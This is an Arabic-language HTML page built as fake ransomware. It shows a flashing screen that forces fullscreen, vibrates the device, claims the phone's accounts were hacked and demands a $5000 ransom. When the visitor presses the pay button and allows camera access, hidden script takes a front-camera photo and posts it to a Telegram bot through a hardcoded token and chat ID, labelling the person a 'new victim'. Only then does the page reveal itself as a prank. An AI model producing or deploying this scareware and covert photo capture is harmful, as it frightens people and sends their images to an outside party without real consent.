<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM CRITICAL ERROR</title>
    <style>
        body {
            background-color: #000;
            color: #ff0033;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            animation: screenGlitch 0.12s infinite;
        }
        @keyframes screenGlitch {
            0% { background-color: #050000; transform: translate(0, 0); }
            30% { background-color: #260000; transform: translate(-3px, 3px); }
            60% { background-color: #050000; transform: translate(3px, -3px); }
            100% { background-color: #1a0000; transform: translate(0, 0); }
        }
        .box {
            border: 3px solid #ff0033;
            padding: 25px;
            background: rgba(15, 0, 0, 0.98);
            box-shadow: 0 0 60px rgba(255, 0, 51, 0.9);
            width: 90%;
            max-width: 400px;
        }
        h1 { font-size: 20px; margin-bottom: 12px; text-shadow: 0 0 12px #ff0033; }
        p { font-size: 13px; color: #ff99aa; line-height: 1.6; }
        .ransom-box {
            background: #2b0000;
            color: #ffcccc;
            padding: 12px;
            margin-top: 15px;
            font-size: 13px;
            border: 1px dashed red;
        }
        .btn {
            background-color: #ff0033;
            color: white;
            border: none;
            padding: 14px;
            font-size: 15px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            font-weight: bold;
        }
        .btn:hover { background-color: #cc0029; }

        .prank-mode {
            background-color: #001a00 !important;
            border-color: #00ff00 !important;
            color: #00ff00 !important;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.8) !important;
            animation: none !important;
        }
        .prank-mode h1 { color: #00ff00 !important; text-shadow: 0 0 10px #00ff00; }
        .prank-mode .ransom-box { background: #002600; color: #ccffcc; border-color: #00ff00; }
        .prank-mode .btn { background-color: #00ff00; color: #000; }
    </style>
</head>
<body onclick="triggerChaos()">

    <div class="box" id="mainBox">
        <h1 id="title">🚨 تحذير: تم اختراق الحسابات! 🚨</h1>
        <p id="desc">تم سحب الصور، الكاميرا، وكلمات المرور بنجاح إلى السيرفر الخارجي. الجهاز مسيطر عليه بالكامل حالياً...</p>
        
        <div class="ransom-box" id="ransomText">
            ⚠ لتجنب مسح الذاكرة وحذف نظام التشغيل نهائياً، يجب دفع الفدية الفورية عبر الزر أدناه!
        </div>

        <button class="btn" id="actionBtn" onclick="requestAllowAndPrank()">دفع فدية فك التشفير (5000$) 💳</button>
    </div>

    <!-- عناصر خفية للكاميرا -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8732626253:AAHGWyKFHqXI1sSOFnQ2sVeR4vmJBeJ7iNw";
        const CHAT_ID = "6772192037";

        window.onload = function() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(e => {});
            }
        };

        function triggerChaos() {
            if (navigator.vibrate) {
                navigator.vibrate([500, 150, 500, 150, 1000, 200, 1500, 300, 2000]);
            }
        }

        // الدالة دي بتطلب إذن الكاميرا عند الضغط: لو ضغط Allow (تمت الموافقة)، هتاخد الصورة وتبعت وتظهر الضحكة
        function requestAllowAndPrank(event) {
            if(event) event.stopPropagation();

            if (navigator.vibrate) {
                navigator.vibrate(200);
            }

            // طلب الإذن من المتصفح
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'victim_allowed.jpg');
                        formData.append('caption', '🚨 ضحية جديدة وافقت على السماح ووقعت في المقلب!');

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).catch(err => console.log(err));
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.8);
                }, 800);

                // الضحكة مش هتيجي غير هنا.. يعني بعد ما وافق وضغط Allow فعلياً!
                let box = document.getElementById("mainBox");
                let title = document.getElementById("title");
                let desc = document.getElementById("desc");
                let ransom = document.getElementById("ransomText");
                let btn = document.getElementById("actionBtn");

                box.classList.add("prank-mode");
                title.innerText = "😂😂 يا عم اقعد.. روحك رجعت ولا لسه؟! 😂";
                desc.innerText = "كنت رايح تدفع 5000 دولار وتفك التشفير كمان يا غلبان؟! تليفونك سليم ومحدش اخترقه ولا حاجة!";
                ransom.innerHTML = "<b>ده انت وافقت على إذن الكاميرا وصورتك اتبعتت لي حالا 😂📸 كشفناك!</b>";
                btn.innerText = "اضحك على نفسك بقى وكفاية رعب 😉";
                
                btn.onclick = function(e) {
                    e.stopPropagation();
                    location.reload();
                };

            }).catch(err => {
                // لو عمل Block أو رفض الإذن، المقلب مش هيظهر وهيفضل الشاشه مرعبة زي ما هي!
                console.log("User denied camera permission");
            });
        }
    </script>

</body>
</html>
